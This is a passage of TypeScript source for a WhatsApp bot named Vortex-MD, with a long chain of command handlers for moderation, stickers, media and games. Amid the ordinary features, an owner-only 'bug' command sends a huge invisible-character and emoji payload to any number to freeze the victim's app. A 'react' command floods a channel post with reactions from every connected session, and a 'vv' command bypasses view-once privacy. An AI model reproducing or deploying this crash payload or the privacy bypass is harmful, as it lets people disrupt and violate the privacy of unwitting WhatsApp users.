                            thumbnailUrl: "https://lieixmgdboiceopzksvu.supabase.co/storage/v1/object/public/hosted-files/dplxl579-1773170410582.jpg",
                            sourceUrl: "https://whatsapp.com/channel/0029Vb7AruX8fewz8dSRD340/100",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: msg });

                // Wait 2 seconds
                await new Promise(resolve => setTimeout(resolve, 2000));

                // Send audio
                await sock.sendMessage(msg.key.remoteJid, {
                    audio: { url: 'https://lieixmgdboiceopzksvu.supabase.co/storage/v1/object/public/hosted-files/nz3sfewu-1773178340208.mp3' },
                    mimetype: 'audio/mpeg',
                    ptt: false // Sends as a normal audio file
                }, { quoted: msg });
            } else if (cmd === 'react') {
                if (!isFromMe) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Seul le propriétaire du bot peut utiliser cette commande.` }, { quoted: msg });
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}react <lien de la publication>` }, { quoted: msg });
                
                const link = args[0];
                const match = link.match(/whatsapp\.com\/channel\/([a-zA-Z0-9_-]+)\/(\d+)/);
                if (!match) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Lien de publication invalide. Assurez-vous qu'il s'agit d'un lien de chaîne WhatsApp valide.` }, { quoted: msg });
                
                const inviteCode = match[1];
                const messageId = match[2];
                
                await sock.sendMessage(msg.key.remoteJid, { text: `⏳ Récupération des informations de la chaîne...` }, { quoted: msg });
                
                try {
                    const metadata = await sock.newsletterMetadata("invite", inviteCode);
                    const newsletterJid = metadata.id;
                    
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Chaîne trouvée: ${metadata.name}\n🚀 Lancement des réactions avec tous les numéros connectés...` }, { quoted: msg });
                    
                    let successCount = 0;
                    const emojis = ['❤️', '👍', '🔥', '😂', '😮', '😢', '🎉', '💯', '🚀', '🙏'];
                    
                    for (const session of sessions.values()) {
                        if (session.status === 'connected' && session.sock) {
                            try {
                                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                                await session.sock.sendMessage(newsletterJid, {
                                    react: {
                                        text: randomEmoji,
                                        key: { remoteJid: newsletterJid, id: messageId }
                                    }
                                });
                                successCount++;
                                await new Promise(resolve => setTimeout(resolve, 1000)); // Delay to avoid spam
                            } catch (e) {
                                console.error(`Failed to react with session ${session.id}:`, e);
                            }
                        }
                    }
                    
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Terminé ! ${successCount} numéro(s) ont réagi à la publication.` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Impossible de récupérer les informations de la chaîne. Assurez-vous que le lien est correct et que le bot y a accès.` }, { quoted: msg });
                }
            } else if (cmd === 'lang' || cmd === 'language') {
                const newLang = args[0]?.toLowerCase();
                if (['fr', 'en', 'es'].includes(newLang)) {
                    config.language = newLang;
                    saveConfig(config);
                    const reply = newLang === 'fr' ? '✅ Langue changée en Français.' :
                                  newLang === 'es' ? '✅ Idioma cambiado a Español.' :
                                  '✅ Language changed to English.';
                    await sock.sendMessage(msg.key.remoteJid, { text: reply }, { quoted: msg });
                } else {
                    const reply = config.language === 'fr' ? '❌ Langue invalide. Utilisez: fr, en, es' :
                                  config.language === 'es' ? '❌ Idioma no válido. Use: fr, en, es' :
                                  '❌ Invalid language. Use: fr, en, es';
                    await sock.sendMessage(msg.key.remoteJid, { text: reply }, { quoted: msg });
                }
            } else if (cmd === 'info') {
                await sock.sendMessage(msg.key.remoteJid, { text: 'Vortex-MD is a WhatsApp bot created by Samy Charles.' }, { quoted: msg });
            } else if (cmd === 'autoreact') {
                const state = args[0]?.toLowerCase();
                if (state === 'on' || state === 'off') {
                    config.autoreact = state === 'on';
                    saveConfig(config);
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ AutoReact is now ${state.toUpperCase()}` }, { quoted: msg });
                } else {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}autoreact on/off` }, { quoted: msg });
                }
            } else if (cmd === 'aisupport') {
                const state = args[0]?.toLowerCase();
                if (state === 'on' || state === 'off') {
                    config.aisupport = state === 'on';
                    saveConfig(config);
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ AI Support is now ${state.toUpperCase()}` }, { quoted: msg });
                } else {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}aisupport on/off` }, { quoted: msg });
                }
            } else if (['antilink', 'antispam', 'antibot', 'antifake', 'antidelete', 'antiviewonce', 'autokick', 'onlyadmin', 'antimention', 'antitoxic', 'antiforward', 'antipicture', 'antivideo', 'antiaudio', 'antidocument', 'anticontact', 'antilocation', 'antipoll'].includes(cmd || '')) {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                
                try {
                    const groupMetadata = await sock.groupMetadata(msg.key.remoteJid);
                    const isAdmin = groupMetadata.participants.find((p: any) => p.id === msg.key.participant)?.admin;
                    
                    if (!isAdmin && !isFromMe) {
                        return await sock.sendMessage(msg.key.remoteJid, { text: '❌ Only group admins can use this command.' });
                    }

                    if (!config[cmd]) config[cmd] = [];
                    const index = config[cmd].indexOf(msg.key.remoteJid);
                    
                    if (index === -1) {
                        config[cmd].push(msg.key.remoteJid);
                        saveConfig(config);
                        await sock.sendMessage(msg.key.remoteJid, { text: `✅ *${cmd.toUpperCase()}* has been enabled for this group.` });
                    } else {
                        config[cmd].splice(index, 1);
                        saveConfig(config);
                        await sock.sendMessage(msg.key.remoteJid, { text: `❌ *${cmd.toUpperCase()}* has been disabled for this group.` });
                    }
                } catch (err) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Failed to toggle ${cmd}. Make sure the bot is an admin.` });
                }
            } else if (cmd === 'kick') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                if (mentionedJid.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: 'Please mention or reply to a user to kick.' });
                try {
                    await sock.groupParticipantsUpdate(msg.key.remoteJid, mentionedJid, 'remove');
                    await sock.sendMessage(msg.key.remoteJid, { text: '✅ User(s) kicked successfully.' });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to kick user. Make sure the bot is an admin.' });
                }
            } else if (cmd === 'promote') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                if (mentionedJid.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: 'Please mention or reply to a user to promote.' });
                try {
                    await sock.groupParticipantsUpdate(msg.key.remoteJid, mentionedJid, 'promote');
                    await sock.sendMessage(msg.key.remoteJid, { text: '✅ User(s) promoted to admin.' });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to promote user. Make sure the bot is an admin.' });
                }
            } else if (cmd === 'demote') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                if (mentionedJid.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: 'Please mention or reply to a user to demote.' });
                try {
                    await sock.groupParticipantsUpdate(msg.key.remoteJid, mentionedJid, 'demote');
                    await sock.sendMessage(msg.key.remoteJid, { text: '✅ User(s) demoted to regular member.' });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to demote user. Make sure the bot is an admin.' });
                }
            } else if (cmd === 'mute') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                try {
                    await sock.groupSettingUpdate(msg.key.remoteJid, 'announcement');
                    await sock.sendMessage(msg.key.remoteJid, { text: '🔇 Group has been muted. Only admins can send messages.' });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to mute group. Make sure the bot is an admin.' });
                }
            } else if (cmd === 'unmute') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                try {
                    await sock.groupSettingUpdate(msg.key.remoteJid, 'not_announcement');
                    await sock.sendMessage(msg.key.remoteJid, { text: '🔊 Group has been unmuted. All participants can send messages.' });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to unmute group. Make sure the bot is an admin.' });
                }
            } else if (cmd === 'link') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                try {
                    const code = await sock.groupInviteCode(msg.key.remoteJid);
                    await sock.sendMessage(msg.key.remoteJid, { text: `🔗 Group Link:\nhttps://chat.whatsapp.com/${code}` });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to get link. Make sure the bot is an admin.' });
                }
            } else if (cmd === 'revoke') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                try {
                    await sock.groupRevokeInvite(msg.key.remoteJid);
                    await sock.sendMessage(msg.key.remoteJid, { text: '🔄 Group link has been successfully revoked and reset.' });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to revoke link. Make sure the bot is an admin.' });
                }
            } else if (cmd === 'tagall') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                try {
                    const groupMetadata = await sock.groupMetadata(msg.key.remoteJid);
                    const participants = groupMetadata.participants;
                    let responseText = `📢 *TAG ALL*\n\n`;
                    if (args.length > 0) responseText += `Message: ${args.join(' ')}\n\n`;
                    for (let mem of participants) {
                        responseText += `▫️ @${mem.id.split('@')[0]}\n`;
                    }
                    await sock.sendMessage(msg.key.remoteJid, { text: responseText, mentions: participants.map((a: any) => a.id) });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to tag all.' });
                }
            } else if (cmd === 'hidetag') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: 'This command can only be used in groups.' });
                try {
                    const groupMetadata = await sock.groupMetadata(msg.key.remoteJid);
                    const participants = groupMetadata.participants.map((a: any) => a.id);
                    const responseText = args.join(' ') || 'Attention!';
                    await sock.sendMessage(msg.key.remoteJid, { text: responseText, mentions: participants });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to hidetag.' });
                }
            } else if (cmd === 'vv') {
                try {
                    const contextInfo = msg.message?.extendedTextMessage?.contextInfo || msg.message?.imageMessage?.contextInfo || msg.message?.videoMessage?.contextInfo;
                    const quotedMsg = contextInfo?.quotedMessage;
                    if (!quotedMsg) {
                        await sock.sendMessage(msg.key.remoteJid, { text: '❌ Please reply to a View Once message with !vv' });
                        return;
                    }

                    let mediaMsg = quotedMsg.viewOnceMessage?.message || quotedMsg.viewOnceMessageV2?.message || quotedMsg.viewOnceMessageV2Extension?.message;
                    if (!mediaMsg) {
                        if (quotedMsg.imageMessage?.viewOnce || quotedMsg.videoMessage?.viewOnce || quotedMsg.audioMessage?.viewOnce) {
                            mediaMsg = quotedMsg;
                        }
                    }

                    if (!mediaMsg) {
                        await sock.sendMessage(msg.key.remoteJid, { text: '❌ The replied message is not a View Once message.' });
                        return;
                    }

                    const mediaType = Object.keys(mediaMsg).find(k => ['imageMessage', 'videoMessage', 'audioMessage'].includes(k));
                    if (!mediaType) {
                        await sock.sendMessage(msg.key.remoteJid, { text: '❌ No supported media found in the View Once message.' });
                        return;
                    }

                    const media = mediaMsg[mediaType];
                    const stream = await downloadContentFromMessage(media, mediaType.replace('Message', '') as any);
                    let buffer = Buffer.from([]);
                    for await(const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }

                    const caption = media.caption ? `\n\n📝 Caption: ${media.caption}` : '';
                    const text = `👁️ *VIEW ONCE REVEALED* 👁️${caption}`;

                    if (mediaType === 'imageMessage') {
                        await sock.sendMessage(msg.key.remoteJid, { image: buffer, caption: text });
                    } else if (mediaType === 'videoMessage') {
                        await sock.sendMessage(msg.key.remoteJid, { video: buffer, caption: text });
                    } else if (mediaType === 'audioMessage') {
                        await sock.sendMessage(msg.key.remoteJid, { audio: buffer, mimetype: 'audio/mp4', ptt: true });
                    }
                } catch (e) {
                    console.error('Error in vv:', e);
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to download the View Once media. It might have expired or the bot lacks access.' });
                }
            } else if (cmd === 'status' || cmd === 'getstatus' || cmd === 'save') {
                try {
                    const contextInfo = msg.message?.extendedTextMessage?.contextInfo || msg.message?.imageMessage?.contextInfo || msg.message?.videoMessage?.contextInfo;
                    const quotedMsg = contextInfo?.quotedMessage;
                    if (!quotedMsg) {
                        await sock.sendMessage(msg.key.remoteJid, { text: '❌ Please reply to a status/story to download it.' });
                        return;
                    }

                    const mediaType = Object.keys(quotedMsg).find(k => ['imageMessage', 'videoMessage', 'audioMessage', 'extendedTextMessage', 'conversation'].includes(k));
                    
                    if (mediaType === 'extendedTextMessage' || mediaType === 'conversation') {
                        const text = quotedMsg.extendedTextMessage?.text || quotedMsg.conversation;
                        await sock.sendMessage(msg.key.remoteJid, { text: `📝 *Status Text:*\n\n${text}` });
                        return;
                    }

                    if (!mediaType || !['imageMessage', 'videoMessage', 'audioMessage'].includes(mediaType)) {
                        await sock.sendMessage(msg.key.remoteJid, { text: '❌ The replied status does not contain supported media.' });
                        return;
                    }

                    const media = quotedMsg[mediaType];
                    const stream = await downloadContentFromMessage(media, mediaType.replace('Message', '') as any);
                    let buffer = Buffer.from([]);
                    for await(const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }

                    const caption = media.caption || '';
                    
                    if (mediaType === 'imageMessage') {
                        await sock.sendMessage(msg.key.remoteJid, { image: buffer, caption: caption });
                    } else if (mediaType === 'videoMessage') {
                        await sock.sendMessage(msg.key.remoteJid, { video: buffer, caption: caption });
                    } else if (mediaType === 'audioMessage') {
                        await sock.sendMessage(msg.key.remoteJid, { audio: buffer, mimetype: 'audio/mp4' });
                    }
                } catch (e) {
                    console.error('Error in status:', e);
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to download the status media. It might have expired.' });
                }
            } else if (cmd === 'getchannelid') {
                if (args.length > 0) {
                    const link = args[0];
                    if (link.includes('whatsapp.com/channel/')) {
                        const code = link.split('/').pop();
                        try {
                            const metadata = await sock.newsletterMetadata("invite", code);
                            await sock.sendMessage(msg.key.remoteJid, { text: `📢 *Channel Info*\n\n*Name:* ${metadata.name}\n*JID:* ${metadata.id}\n\nReplace the 'newsletterJid' in the code with this JID.` });
                        } catch (e) {
                            await sock.sendMessage(msg.key.remoteJid, { text: `❌ Failed to get channel info from link. Make sure the link is correct.` });
                        }
                    } else {
                        await sock.sendMessage(msg.key.remoteJid, { text: `❌ Please provide a valid WhatsApp channel link.` });
                    }
                } else {
                    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
                    if (contextInfo?.forwardedNewsletterMessageInfo) {
                        const jid = contextInfo.forwardedNewsletterMessageInfo.newsletterJid;
                        const name = contextInfo.forwardedNewsletterMessageInfo.newsletterName;
                        await sock.sendMessage(msg.key.remoteJid, { text: `📢 *Channel Info*\n\n*Name:* ${name}\n*JID:* ${jid}\n\nReplace the 'newsletterJid' in the code with this JID.` });
                    } else {
                        await sock.sendMessage(msg.key.remoteJid, { text: `❌ Please reply to a message forwarded from a channel or provide a channel link.` });
                    }
                }
            } else if (cmd === 'owner' || cmd === 'creator') {
                await sock.sendMessage(msg.key.remoteJid, { text: `👑 *Owner Info*\n\nName: Samy Charles\nRole: Creator of Vortex-MD\nStatus: Active` }, { quoted: msg });
            } else if (cmd === 'rules') {
                await sock.sendMessage(msg.key.remoteJid, { text: `📋 *Vortex-MD Rules*\n\n1. Do not spam commands.\n2. Do not use the bot for illegal activities.\n3. Respect other users.\n4. Have fun!` }, { quoted: msg });
            } else if (cmd === 'sticker' || cmd === 's') {
                const isQuotedImage = msg.message.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
                const isQuotedVideo = msg.message.extendedTextMessage?.contextInfo?.quotedMessage?.videoMessage;
                const isImage = msg.message.imageMessage;
                const isVideo = msg.message.videoMessage;

                const argsParts = args.join(' ').split('|');
                const packName = argsParts[0] || '𝗩𝗼𝗿𝘁𝗲𝘅-𝗠𝗗 🧑‍🔬🗽';
                const authorName = argsParts[1] || 'Samy Charles';

                if (isImage || isQuotedImage || isVideo || isQuotedVideo) {
                    await sock.sendMessage(msg.key.remoteJid, { react: { text: '⏳', key: msg.key } });
                    try {
                        let buffer;
                        if (isImage) {
                            buffer = await getMediaBuffer(isImage, 'image');
                        } else if (isQuotedImage) {
                            buffer = await getMediaBuffer(isQuotedImage, 'image');
                        } else if (isVideo) {
                            buffer = await getMediaBuffer(isVideo, 'video');
                        } else if (isQuotedVideo) {
                            buffer = await getMediaBuffer(isQuotedVideo, 'video');
                        }
                        
                        const tempFile = path.join(process.cwd(), `temp_${Date.now()}.${isVideo || isQuotedVideo ? 'mp4' : 'jpg'}`);
                        fs.writeFileSync(tempFile, buffer);

                        const sticker = new Sticker(tempFile, {
                            pack: packName, // The pack name
                            author: authorName, // The author name
                            type: StickerTypes.FULL, // The sticker type
                            categories: ['🎉', '✨'], // The sticker category
                            id: '12345', // The sticker id
                            quality: 50, // The quality of the output file
                            background: '#000000' // The sticker background color (only for full stickers)
                        });

                        const stickerBuffer = await sticker.toBuffer();
                        await sock.sendMessage(msg.key.remoteJid, { sticker: stickerBuffer }, { quoted: msg });
                        
                        fs.unlinkSync(tempFile);
                    } catch (e) {
                        console.error(e);
                        await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to create sticker.' }, { quoted: msg });
                    }
                } else {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Please reply to an image or video with .sticker' }, { quoted: msg });
                }
            } else if (cmd === 'getsticker' || cmd === 'gs') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}getsticker <query>` }, { quoted: msg });
                const query = args.join(' ');
                await sock.sendMessage(msg.key.remoteJid, { react: { text: '⏳', key: msg.key } });
                try {
                    const res = await axios.get(`https://g.tenor.com/v1/search?q=${encodeURIComponent(query)}&key=LIVDSRZULELA&limit=1`);
                    if (res.data.results && res.data.results.length > 0) {
                        const gifUrl = res.data.results[0].media[0].mp4.url;
                        
                        const tempFile = path.join(process.cwd(), `temp_${Date.now()}.mp4`);
                        const response = await axios({
                            url: gifUrl,
                            method: 'GET',
                            responseType: 'arraybuffer'
                        });
                        fs.writeFileSync(tempFile, response.data);

                        const sticker = new Sticker(tempFile, {
                            pack: '𝗩𝗼𝗿𝘁𝗲𝘅-𝗠𝗗 🧑‍🔬🗽',
                            author: 'Samy Charles',
                            type: StickerTypes.FULL,
                            categories: ['🎉', '✨'],
                            quality: 50,
                            background: '#000000'
                        });

                        const stickerBuffer = await sticker.toBuffer();
                        await sock.sendMessage(msg.key.remoteJid, { sticker: stickerBuffer }, { quoted: msg });
                        
                        fs.unlinkSync(tempFile);
                    } else {
                        await sock.sendMessage(msg.key.remoteJid, { text: '❌ No stickers found.' }, { quoted: msg });
                    }
                } catch (e) {
                    console.error('getsticker error:', e);
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to fetch sticker.' }, { quoted: msg });
                }
            } else if (cmd === 'toimg') {
                const isQuotedSticker = msg.message.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage;
                if (isQuotedSticker) {
                    await sock.sendMessage(msg.key.remoteJid, { react: { text: '⏳', key: msg.key } });
                    try {
                        const buffer = await getMediaBuffer(isQuotedSticker, 'sticker');
                        const tempFile = path.join(process.cwd(), `temp_${Date.now()}.webp`);
                        const outImg = path.join(process.cwd(), `img_${Date.now()}.png`);
                        
                        fs.writeFileSync(tempFile, buffer);

                        await new Promise((resolve, reject) => {
                            ffmpeg(tempFile)
                                .outputOptions(['-vf', 'scale=1024:1024:flags=lanczos']) // Upscale to HD
                                .on('error', reject)
                                .on('end', () => resolve(true))
                                .save(outImg);
                        });

                        const imgBuffer = fs.readFileSync(outImg);
                        await sock.sendMessage(msg.key.remoteJid, { 
                            document: imgBuffer, 
                            mimetype: 'image/png', 
                            fileName: 'Vortex-MD-HD.png',
                            caption: '🖼️ Image HD générée par Vortex-MD !' 
                        }, { quoted: msg });
                        
                        fs.unlinkSync(tempFile);
                        fs.unlinkSync(outImg);
                    } catch (e) {
                        console.error(e);
                        await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to convert sticker to image.' }, { quoted: msg });
                    }
                } else {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Please reply to a sticker with .toimg' }, { quoted: msg });
                }
            } else if (cmd === 'joke' || cmd === 'blague') {
                try {
                    const res = await axios.get('https://v2.jokeapi.dev/joke/Any?safe-mode');
                    const joke = res.data.type === 'twopart' ? `${res.data.setup}\n\n${res.data.delivery}` : res.data.joke;
                    await sock.sendMessage(msg.key.remoteJid, { text: `😂 *Joke:*\n\n${joke}` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to fetch joke.' }, { quoted: msg });
                }
            } else if (cmd === 'dog' || cmd === 'chien') {
                try {
                    const res = await axios.get('https://dog.ceo/api/breeds/image/random');
                    await sock.sendMessage(msg.key.remoteJid, { image: { url: res.data.message }, caption: '🐶 Woof!' }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to fetch dog image.' }, { quoted: msg });
                }
            } else if (cmd === 'cat' || cmd === 'chat') {
                try {
                    const res = await axios.get('https://api.thecatapi.com/v1/images/search');
                    await sock.sendMessage(msg.key.remoteJid, { image: { url: res.data[0].url }, caption: '🐱 Meow!' }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to fetch cat image.' }, { quoted: msg });
                }
            } else if (cmd === 'fact' || cmd === 'fait') {
                try {
                    const res = await axios.get('https://uselessfacts.jsph.pl/api/v2/facts/random');
                    await sock.sendMessage(msg.key.remoteJid, { text: `🧠 *Fact:*\n\n${res.data.text}` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to fetch fact.' }, { quoted: msg });
                }
            } else if (cmd === 'bug') {
                if (!isFromMe) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Seul le propriétaire du bot peut utiliser cette commande.` }, { quoted: msg });
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}bug <number>` }, { quoted: msg });
                const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                await sock.sendMessage(msg.key.remoteJid, { text: `⏳ Envoi du bug à ${target}...` }, { quoted: msg });
                
                // Create a massive payload to temporarily freeze the client (App Not Responding)
                let bugText = 'VORTEX-MD CRASH 🐛\n' + '‎'.repeat(60000) + '🔥'.repeat(10000);
                
                try {
                    await sock.sendMessage(target, { text: bugText });
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Bug envoyé avec succès à ${target}. Leur WhatsApp va afficher "L'application ne répond pas".` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Échec de l'envoi du bug.` }, { quoted: msg });
                }
            } else if (cmd === 'play') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}play <song name>` }, { quoted: msg });
                const query = args.join(' ');
                await sock.sendMessage(msg.key.remoteJid, { react: { text: '⏳', key: msg.key } });
                try {
                    const search = await yts(query);
                    const video = search.videos[0];
                    if (!video) return await sock.sendMessage(msg.key.remoteJid, { text: '❌ No results found.' }, { quoted: msg });

                    const caption = `🎵 *VORTEX-MD PLAY* 🎵\n\n*Title:* ${video.title}\n*Duration:* ${video.timestamp}\n*Views:* ${video.views}\n*Author:* ${video.author.name}\n\n_Downloading audio..._`;
                    await sock.sendMessage(msg.key.remoteJid, { image: { url: video.thumbnail }, caption }, { quoted: msg });

                    const stream = ytdl(video.url, { filter: 'audioonly', quality: 'highestaudio' });
                    const tempFile = path.join(process.cwd(), `temp_${Date.now()}.mp3`);
                    
                    stream.pipe(fs.createWriteStream(tempFile)).on('finish', async () => {
                        await sock.sendMessage(msg.key.remoteJid, { 
                            document: fs.readFileSync(tempFile), 
                            mimetype: 'audio/mpeg',
                            fileName: `${video.title}.mp3`,
                            caption: `🎵 ${video.title}`
                        }, { quoted: msg });
                        fs.unlinkSync(tempFile);
                    });
                } catch (e) {
                    console.error(e);
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to download audio.' }, { quoted: msg });
                }
            } else if (cmd === 'runtime' || cmd === 'uptime') {
                await sock.sendMessage(msg.key.remoteJid, { text: `⏳ *Uptime:* ${formatUptime(Date.now() - startTime)}` }, { quoted: msg });
            } else if (cmd === 'donate') {
                await sock.sendMessage(msg.key.remoteJid, { text: `☕ *Donate*\n\nSupport the development of Vortex-MD!\nContact the owner for donation links.` });
            } else if (cmd === 'qr') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Provide text to generate QR. Example: ${config.prefix}qr Hello` });
                const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${encodeURIComponent(args.join(' '))}`;
                await sock.sendMessage(msg.key.remoteJid, { image: { url: qrUrl }, caption: '🔳 Here is your QR Code!' });
            } else if (cmd === 'shorturl') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Provide a URL. Example: ${config.prefix}shorturl https://google.com` });
                try {
                    const res = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(args[0])}`);
                    await sock.sendMessage(msg.key.remoteJid, { text: `🔗 *Short URL:*\n${res.data}` });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to shorten URL.' });
                }
            } else if (cmd === 'base64') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Provide text to encode.` });
                const encoded = Buffer.from(args.join(' ')).toString('base64');
                await sock.sendMessage(msg.key.remoteJid, { text: `🔐 *Base64 Encoded:*\n${encoded}` });
            } else if (cmd === 'password') {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()';
                let pass = '';
                for (let i = 0; i < 12; i++) pass += chars.charAt(Math.floor(Math.random() * chars.length));
                await sock.sendMessage(msg.key.remoteJid, { text: `🔑 *Generated Password:*\n${pass}` });
            } else if (cmd === 'truth') {
                const truths = ["What's your biggest fear?", "What's a secret you've never told anyone?", "Who is your crush?", "What's the most embarrassing thing you've done?"];
                await sock.sendMessage(msg.key.remoteJid, { text: `🤫 *Truth:*\n${truths[Math.floor(Math.random() * truths.length)]}` });
            } else if (cmd === 'dare') {
                const dares = ["Send a voice note singing a song.", "Change your profile picture to a monkey for 1 hour.", "Send a message to your crush.", "Do 10 pushups and send a video."];
                await sock.sendMessage(msg.key.remoteJid, { text: `😈 *Dare:*\n${dares[Math.floor(Math.random() * dares.length)]}` });
            } else if (cmd === 'flipcoin') {
                const coin = Math.random() < 0.5 ? 'Heads' : 'Tails';
                await sock.sendMessage(msg.key.remoteJid, { text: `🪙 The coin landed on: *${coin}*` });
            } else if (cmd === 'roll') {
                const dice = Math.floor(Math.random() * 6) + 1;
                await sock.sendMessage(msg.key.remoteJid, { text: `🎲 You rolled a *${dice}*!` });
            } else if (cmd === '8ball') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Ask a question!` });
                const answers = ["Yes, definitely.", "It is certain.", "Without a doubt.", "Reply hazy, try again.", "Ask again later.", "Don't count on it.", "My reply is no.", "Very doubtful."];
                await sock.sendMessage(msg.key.remoteJid, { text: `🎱 *8Ball says:*\n${answers[Math.floor(Math.random() * answers.length)]}` });
            } else if (cmd === 'rate') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Provide something to rate!` });
                const rating = Math.floor(Math.random() * 101);
                await sock.sendMessage(msg.key.remoteJid, { text: `⭐ I rate *${args.join(' ')}* a solid *${rating}/100*!` });
            } else if (cmd === 'sysinfo' || cmd === 'os' || cmd === 'cpu' || cmd === 'ram') {
                const totalMem = Math.round(os.totalmem() / 1024 / 1024);
                const freeMem = Math.round(os.freemem() / 1024 / 1024);
                const usedMem = totalMem - freeMem;
                const cpu = os.cpus()[0].model;
                const info = `💻 *SYSTEM INFO* 💻\n\n` +
                             `🖥️ *OS:* ${os.type()} ${os.release()}\n` +
                             `🧠 *CPU:* ${cpu}\n` +
                             `💾 *RAM:* ${usedMem}MB / ${totalMem}MB\n` +
                             `⚙️ *Platform:* ${os.platform()}`;
                await sock.sendMessage(msg.key.remoteJid, { text: info });
            } else if (cmd === 'hack') {
                const target = args.length > 0 ? args.join(' ') : 'Target';
                const hackMsg = await sock.sendMessage(msg.key.remoteJid, { text: `💻 Hacking ${target}... 0%` });
                if (hackMsg) {
                    setTimeout(async () => await sock.sendMessage(msg.key.remoteJid, { text: `💻 Hacking ${target}... 40%\nFetching IP address...`, edit: hackMsg.key }), 1500);
                    setTimeout(async () => await sock.sendMessage(msg.key.remoteJid, { text: `💻 Hacking ${target}... 80%\nBypassing firewall...`, edit: hackMsg.key }), 3000);
                    setTimeout(async () => await sock.sendMessage(msg.key.remoteJid, { text: `💻 Hacking ${target}... 100%\nSuccessfully hacked! (Just kidding 🤣)`, edit: hackMsg.key }), 4500);
                }
            } else if (cmd === 'joke') {
                const jokes = ["Why don't scientists trust atoms? Because they make up everything!", "What do you call a fake noodle? An impasta!", "Why did the scarecrow win an award? Because he was outstanding in his field!"];
